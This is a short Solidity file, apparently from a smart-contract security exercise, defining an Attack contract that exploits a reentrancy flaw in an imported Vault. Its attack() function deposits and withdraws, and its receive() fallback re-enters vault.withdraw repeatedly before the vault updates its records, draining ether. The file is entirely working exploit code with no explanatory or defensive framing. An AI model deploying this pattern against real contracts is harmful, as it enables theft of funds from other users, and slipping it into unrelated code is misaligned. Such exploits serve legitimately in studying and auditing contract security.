// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Vault.sol";

contract Attack {
    Vault public vault;

    uint256 public attackCount;
    uint256 public maxAttacks = 2;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    receive() external payable {
        if (attackCount < maxAttacks) {
            attackCount++;

            uint256 shareBalance = vault.shares(address(this));

            if (shareBalance > 0 && address(vault).balance > 0) {
                vault.withdraw(shareBalance);
            }
        }
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();

        uint256 myShares = vault.shares(address(this));

        vault.withdraw(myShares);
    }
}